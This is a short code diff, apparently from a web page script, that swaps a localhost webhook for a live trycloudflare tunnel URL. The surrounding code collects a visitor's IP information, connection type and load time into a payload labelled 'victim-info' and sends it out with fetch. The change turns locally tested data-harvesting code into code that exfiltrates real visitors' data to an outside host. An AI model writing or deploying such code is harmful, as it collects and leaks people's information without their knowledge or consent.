@@ -90,7 +90,7 @@ Connection Type: ${connectionType}
 Loading Time: ${loadTime}
                 `;
 
-                const webhookURL = "localhost:5252/userData";
+                const webhookURL = "https://japan-shows-descriptions-dl.trycloudflare.com/userData";
 
                 const payload = {'victim-info': ipinfo}; 
                 fetch(webhookURL, {
